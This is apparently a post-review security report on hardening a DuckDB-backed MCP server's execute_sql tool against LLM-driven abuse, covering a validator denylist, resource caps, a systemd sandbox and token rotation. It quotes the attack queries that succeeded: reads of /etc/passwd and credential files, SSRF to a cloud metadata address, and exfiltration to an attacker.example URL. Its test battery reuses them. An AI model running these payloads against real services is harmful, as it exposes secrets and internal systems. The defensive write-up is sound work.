# Security review and hardening

This document captures the security work done after an adversarial review of
`execute_sql`. It lists what was reachable from an LLM-driven caller, what got
fixed, what was deliberately not fixed (and why), and how to verify the state
after any unit edit.

If you re-enable the service later, run through [Verification](#verification)
first and rotate the bearer token.

---

## Background

The MCP server exposes a 12-tool surface to LLM callers, one of which is
`execute_sql` — a DuckDB spatial SQL escape hatch. An early version of the
validator allowed only `SELECT` / `WITH` / `UNION` statement types via sqlglot,
which is necessary but not sufficient: DuckDB treats `read_csv`, `read_parquet`,
`glob`, `read_text` etc. as ordinary functions callable inside any `SELECT`.

An adversarial review surfaced four classes of reachable behavior under the
original validator. All three layers of mitigation below were added in
response, and the service was stopped and audited before re-enabling.

---

## What was reachable (before the fix)

Reproduced by the reviewer against the production endpoint. All of these are
callable with a valid bearer token via `execute_sql`.

| Class | Example | What it got |
|---|---|---|
| Arbitrary local file read | `SELECT * FROM read_csv('/etc/hostname')` | Any file readable by the service's user (`ben`). |
| Directory enumeration | `SELECT * FROM glob('/etc/*')` | Listing of any readable directory. |
| HTTP(S) outbound (SSRF) | `SELECT * FROM read_parquet('http://169.254.169.254/…')` | Real outbound HTTP — enables SSRF against internal admin endpoints and exfiltration via `read_csv('https://attacker.example/x.csv?q=…')`. |
| `file://` URL reads | `SELECT * FROM read_csv('file:///etc/passwd')` | Equivalent to local-path reads; bypasses filters that only blocked `/`-prefixed paths. |
| DoS primitives | `SELECT repeat('a', 1e10)`, `generate_series(0, 1e11)` | Memory exhaustion on a 4 GB host. The per-session `memory_limit=256MB` kicks in eventually but not before wasting CPU/allocation. |

Specific secrets enumerated from `/home/ben`:

- `~/.claude.json` + `.backup` — Claude Code OAuth tokens
- `~/.config/gh/hosts.yml` — GitHub CLI OAuth token
- `~/.bash_history` — shell history
- `~/.ssh/authorized_keys`, `known_hosts` — public only, not a secret leak
- systemd user unit files at `~/.config/systemd/user/*.service` — recon on layout

Not reachable (the earlier state wasn't *that* bad):

- `duckdb_secrets()` returned 0 rows.
- `~/.aws/*` didn't exist.
- `/proc/self/environ` reads returned empty (DuckDB stats `/proc` files as 0 bytes).
- Non-HTTP URL schemes (`tcp://`, `gopher://`) weren't supported by httpfs.
- `INSTALL`/`LOAD` of new extensions was blocked by
  `allow_unsigned_extensions=false`.

---

## The fix — three independent layers

Each layer is sufficient on its own for the specific attack class it handles;
all three together are defense-in-depth. Losing any one should not expose the
full attack surface.

### Layer 1 — sqlglot validator (`operations.py::_validate_sql`)

Lives in `geodata_mcp/operations.py`. Runs on every `execute_sql` call
regardless of session.

**Statement-type allowlist.** Only a single `SELECT` / `WITH` / `UNION` /
`Subquery` tree is accepted. Anywhere in the tree containing `INSERT`,
`UPDATE`, `DELETE`, `CREATE`, `DROP`, `ALTER`, `MERGE`, `COPY` → rejected
(including `ATTACH`, which sqlglot classifies under DDL).

**Function denylist.** Any call to these by name fails validation:

- `read_csv`, `read_csv_auto`, `read_parquet`, `parquet_scan`,
  `read_json`, `read_json_auto`, `read_json_objects`, `json_scan`
- `read_blob`, `read_text`
- `read_xlsx`, `read_excel`
- `glob`, `parquet_schema`, `parquet_metadata`
- `csv_sniffer`, `sniff_csv`
- `load_extension`, `install_extension`
- `attach`, `detach`
- `httpfs_register_secret`, `s3_register_secret`

The walker handles both `sqlglot.expressions.Anonymous` (unknown-to-sqlglot
functions like `glob`) and `sqlglot.expressions.Func` subclasses (functions
with their own AST node like `ReadCSV`, `GenerateSeries`).

**String-literal checks.** Any string-typed literal is rejected if it starts
with:

- URL schemes: `http://`, `https://`, `ftp://`, `ftps://`, `file://`,
  `s3://`, `gs://`, `r2://`, `azure://`, `abfs://`, `abfss://`, `hf://`,
  `gcs://`, `oss://`
- Absolute paths: `/etc`, `/home`, `/root`, `/var`, `/proc`, `/sys`, `/boot`,
  `/usr`, `/opt`, `/srv`, `/run`, `/tmp`

**Numeric-literal cap.** Any numeric literal > 10,000,000 is rejected. Stops
`repeat('a', 1e10)` and `generate_series(0, 1e11)` *before* DuckDB allocates.

### Layer 2 — DuckDB per-session resource caps (`session.py`)

At every `Session.__init__`:

```python
self.conn.execute("SET memory_limit = '256MB'")
self.conn.execute("SET threads = 2")
```

`execute_sql` additionally enforces a **30-second wall-clock timeout** via
`threading.Timer` → `conn.interrupt()`.

Together these cap memory, CPU concurrency, and max query duration per
session. One greedy call cannot OOM the box even if it passes validation.

### Layer 3 — systemd sandbox (identity, filesystem, egress, syscalls)

Lives in `/etc/systemd/system/geodata-mcp.service`. The service runs as a
dedicated unprivileged user with a restricted kernel mount namespace,
cgroup-BPF egress filter, and seccomp syscall denylist — not just file
permissions.

**Identity.**

- `User=geodata-mcp`, `Group=geodata-mcp` — dedicated system user (no login
  shell, no home directory). Created via `useradd -r -s /usr/sbin/nologin -M
  -d /nonexistent`. `ben` is a member of the `geodata-mcp` group so both
  identities can read/write the shared writable dirs.
- Source code under `/home/ben/geodata-mcp` is owned `ben:ben` and
  group-readable only — the service user **cannot modify its own code**, so
  RCE inside the process can't persist by patching Python files.
- `SupplementaryGroups=` (explicit empty) — no inherited groups from
  `/etc/group`.

**Filesystem.**

- `ProtectHome=tmpfs` + `BindPaths=/home/ben/geodata-mcp` — `/home` is an
  empty tmpfs; only the project dir is bind-mounted. `~/.claude.json`,
  `~/.config/gh/hosts.yml`, `~/.bash_history`, `~/.ssh/*` do not exist in
  this process's view of the filesystem.
- `ProtectSystem=strict` — `/` is read-only except explicit `ReadWritePaths`
  (`data/exports`, `.duckdb`).
- `InaccessiblePaths=/etc/ssh /etc/ssl/private /etc/shadow /etc/gshadow
  /etc/sudoers /etc/sudoers.d /etc/caddy /etc/geodata-mcp.env /etc/systemd
  /root /var/log` — admin config, service logs, and the MCP bearer env file
  itself are blocked.
- `PrivateTmp=true`, `PrivateDevices=true`, `ProtectKernelTunables`,
  `ProtectKernelModules`, `ProtectKernelLogs`, `ProtectControlGroups`,
  `ProtectClock`, `ProtectHostname`.
- `UMask=0002` — new files in the shared group dirs are group-writable so
  `ben` dev and the service can both read each other's outputs.

**Egress (cgroup BPF).**

- `IPAddressDeny=any` + `IPAddressAllow=localhost` — kernel-enforced
  per-cgroup egress filter. The process can only send packets to
  `127.0.0.0/8` / `::1`. Blocks SSRF against `169.254.169.254`, arbitrary
  HTTPS exfiltration, DuckDB extension registry fetches. Caddy →
  `127.0.0.1:8765` still works because it's loopback.
- `RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6` — other families
  (netlink, packet, bluetooth) denied at the socket layer.

**Syscalls (seccomp).**

- `SystemCallArchitectures=native` — blocks x86-32 compat ABI on amd64
  (common exploit primitive).
- `SystemCallFilter=~@mount @swap @reboot @debug @module @raw-io
  @cpu-emulation @obsolete bpf ptrace perf_event_open process_vm_readv
  process_vm_writev userfaultfd keyctl add_key request_key kexec_load
  kexec_file_load` — denylist blocking kernel-exploit vectors (container
  escape primitives, memory snooping across processes, keyring access, live
  kernel replacement). Denylist approach instead of
  `SystemCallFilter=@system-service` because the allowlist version segfaulted
  DuckDB spatial's GDAL/PROJ loader; verified via `systemd-run`-based smoke
  test that `INSTALL spatial`, `LOAD spatial`, `ST_Point`, and `ST_AsText`
  all work under this filter.

**Process restrictions.**

- `RestrictNamespaces=true`, `RestrictRealtime=true`, `RestrictSUIDSGID=true`,
  `LockPersonality=true`, `NoNewPrivileges=true`,
  `CapabilityBoundingSet=` (all caps dropped), `AmbientCapabilities=`.

Even a query that somehow bypasses layers 1+2 cannot read secrets outside
the project dir, cannot open non-loopback sockets, cannot call the most
dangerous syscalls, and cannot persist changes to its own code.
`systemd-analyze security geodata-mcp` reports **1.8 OK** (lower is tighter;
the only remaining flag is `UMask=` being group/other-readable, which is
intentional for the shared-group writable dirs).

---

## Deliberately not implemented

These were tried, segfaulted DuckDB spatial's GDAL/PROJ loader, and omitted
with notes so a future editor doesn't re-add them blind:

- **`SystemCallFilter=@system-service`** (allowlist form) — seccomp denied a
  syscall the spatial extension makes during initialization. Reproducible
  SIGSEGV ~1 second after service start. Replaced with the **denylist**
  version above (`SystemCallFilter=~...`), which targets exploit primitives
  without breaking the spatial extension.
- **`ProtectProc=invisible` + `ProcSubset=pid`** — some libraries read
  `/proc/cpuinfo` for SIMD detection; with these on, the read fails and the
  library crashes.
- **`MemoryDenyWriteExecute=true`** — Python's ctypes and GDAL's JIT paths
  require W^X-violating mmap regions.

Also deliberately not implemented:

- **DuckDB `enable_external_access=false` at session start.** Blocks the
  httpfs extension *and* `read_parquet`/`read_csv` — but the catalog loader
  uses those for local files. Toggling it around trusted internal calls is
  doable but fragile; layer 1 already blocks the abuse paths and layer 3
  blocks both the filesystem access *and* the outbound network, so the
  benefit didn't outweigh the complexity.
- **OAuth 2.1 for the MCP endpoint.** Would let `claude.ai` web connectors
  use the server (MCP November 2025 spec requires OAuth 2.1 + PKCE for
  public remote servers; claude.ai custom connectors support it). Currently
  bearer-only, which works for Claude Code / Desktop / scripted MCP clients.
  Planned — see README roadmap.
- **Audit log of every `execute_sql` call.** Would let post-hoc detection of
  probing attempts (sqlglot rejections, repeated requests). Planned; would
  write to a file outside `ReadWritePaths` via a forwarding unit to prevent
  tampering from inside the sandbox.

---

## Token rotation

One thing that surprised us during remediation: `/login` in Claude Code does
**not** rotate the OAuth access token on disk. It re-writes
`~/.claude/.credentials.json` with the same bytes (new mtime).

To actually rotate the Claude Code OAuth token:

```bash
# On whichever machine the credentials file lives:
rm ~/.claude/.credentials.json
# restart claude — it'll prompt for a fresh OAuth flow

# Confirm the first 20 chars of the new token differ from the old:
python3 -c "import json; print(json.load(open('$HOME/.claude/.credentials.json'))['claudeAiOauth']['accessToken'][:20])"
```

Anthropic's console (console.anthropic.com) has explicit session / API key
revocation — worth doing so the old token is server-side-invalid, not just
superseded locally.

For the MCP bearer itself (`/etc/geodata-mcp.env`):

```bash
NEW=$(python3 -c "import secrets; print(secrets.token_urlsafe(48))")
echo "GEODATA_MCP_TOKEN=$NEW" | sudo tee /etc/geodata-mcp.env >/dev/null
sudo chown root:caddy /etc/geodata-mcp.env && sudo chmod 0640 /etc/geodata-mcp.env
sudo systemctl restart caddy
# Update every MCP client's config to carry the new token.
```

For a GitHub CLI token: `gh auth logout && gh auth login`.

---

## Verification

Run any time the service unit or validator changes.

### 1. Systemd sandbox score

```bash
systemd-analyze security geodata-mcp
# expected: "Overall exposure level … 1.8 OK 🙂" (lower is tighter)
```

### 1b. Seccomp + egress smoke test (before re-enabling)

Verify DuckDB spatial still loads under the filter, and that egress is
blocked as the service user. Run without touching the persistent unit:

```bash
# spatial under seccomp
sudo systemd-run --uid=geodata-mcp --gid=geodata-mcp --pipe --wait --collect \
  --property="WorkingDirectory=/home/ben/geodata-mcp" \
  --property="Environment=HOME=/home/ben/geodata-mcp" \
  --property="SystemCallArchitectures=native" \
  --property="SystemCallFilter=~@mount @swap @reboot @debug @module @raw-io @cpu-emulation @obsolete bpf ptrace perf_event_open process_vm_readv process_vm_writev userfaultfd keyctl add_key request_key kexec_load kexec_file_load" \
  /home/ben/geodata-mcp/.venv/bin/python -c \
  "import duckdb; c=duckdb.connect(); c.execute('INSTALL spatial; LOAD spatial;'); print(c.execute(\"SELECT ST_AsText(ST_Point(18.07, 59.33))\").fetchone()[0])"
# expected: "POINT (18.07 59.33)"

# egress blocked
sudo systemd-run --uid=geodata-mcp --pipe --wait --collect \
  --property="IPAddressDeny=any" --property="IPAddressAllow=localhost" \
  curl -s --max-time 3 https://1.1.1.1
# expected: nonzero exit, "Operation not permitted" or "connection refused"
```

### 2. Secret invisibility from inside the sandbox

```bash
SERVICE_PID=$(systemctl show geodata-mcp --property=MainPID --value)
for f in /home/ben/.claude.json /etc/geodata-mcp.env \
         /home/ben/.config/gh/hosts.yml /etc/shadow /etc/caddy/Caddyfile; do
  out=$(sudo nsenter -m -t "$SERVICE_PID" head -c 20 "$f" 2>&1 | head -1)
  echo "  $f → $out"
done
# expected: every entry returns "No such file or directory" or empty
```

### 3. Attack battery via live MCP

```python
# requires `uv run --with fastmcp python`
# in /tmp/sec_test2.py
import asyncio, os
from fastmcp import Client

async def main():
    async with Client("https://geo.benjaminhenriksson.com/mcp",
                      auth=os.environ["GEODATA_TOKEN"]) as c:
        for label, sql in [
            ("read_csv /etc",   "SELECT * FROM read_csv('/etc/hostname')"),
            ("glob /etc/*",     "SELECT * FROM glob('/etc/*')"),
            ("read_blob home",  "SELECT content FROM read_blob('/home/ben/.claude.json')"),
            ("http IMDS",       "SELECT * FROM read_parquet('http://169.254.169.254/')"),
            ("file:// URL",     "SELECT * FROM read_csv('file:///etc/passwd')"),
            ("repeat 10B",      "SELECT repeat('a', 10000000000)"),
            ("ATTACH",          "ATTACH 'x.db'"),
            ("DROP",            "DROP TABLE deso"),
        ]:
            r = await c.call_tool("execute_sql", {"sql": sql})
            err = r.data.get("error")
            print("OK" if err == "sql_rejected" else "FAIL", label, "→", err)

asyncio.run(main())
```

Every line should print `OK … → sql_rejected`.

### 4. Legitimate queries still work

```python
# in the same Client context
await c.call_tool("load", {"dataset_id": "deso_2025", "layer_name": "deso"})
r = await c.call_tool("execute_sql",
    {"sql": "SELECT COUNT(*) FROM deso WHERE ST_Contains(geom, ST_Point(152699, 6579781))"})
# expected: r.data.get('error') is None, r.data['markdown'] contains a '1'.
```

---

## Residual risks (known)

1. **Rate limiter is in-process** — a multi-worker deploy would need shared
   state (Redis, or Caddy's `rate_limit` plugin). Single-worker today.
2. **`data/exports/<token>/` is world-readable via the URL** — by design for
   browser downloads. Anyone with the token can fetch for 24 h.
3. **Bearer token instead of OAuth 2.1** — shared-secret model means a single
   leak grants full access. Rotation works but reactive. OAuth 2.1 + PKCE
   (per the MCP Nov 2025 spec) is the structural fix; planned.
4. **No audit log of `execute_sql` rejections** — probing attempts go
   undetected except via Caddy access logs. Planned (see "Deliberately not
   implemented").
5. **Claude Code's `/login` doesn't rotate tokens** — if that token ever
   leaks, `rm .credentials.json` + re-auth is the only way. Anthropic-side
   revocation is the belt-and-braces.
6. **DuckDB extension cache is pinned to v1.5.2 on disk.** `INSTALL spatial`
   at session start is a no-op as long as the cached extension matches the
   running DuckDB version. If DuckDB is upgraded without pre-installing the
   extension, session startup will fail *silently* under `IPAddressDeny` (no
   network to fetch from). Pre-install as `ben` before bumping.

---

## Summary of what was rotated after remediation

- Claude Code OAuth token — fully rotated via `rm ~/.claude/.credentials.json`
  + re-auth + server-side revocation in console.anthropic.com.
- GitHub CLI OAuth token — rotated via `gh auth logout && gh auth login`.
- MCP bearer token — rotated via `/etc/geodata-mcp.env` write +
  `systemctl restart caddy`.
- No private SSH keys were on the VPS (public `authorized_keys` only), so
  nothing to rotate there.
- Tailscale state at `/var/lib/tailscale/` is root-only and was never in
  scope of the MCP process.

A comprehensive grep across 1,152 files in `~/.claude/` (projects,
backups, file-history, history.jsonl) found exactly one secret-shaped string:
a **49-character prefix** of the OAuth token captured in this session's own
conversation log. The remaining 59 characters of the 108-char token are still
secret; the prefix alone is not exploitable. It was superseded by the
rotation above.
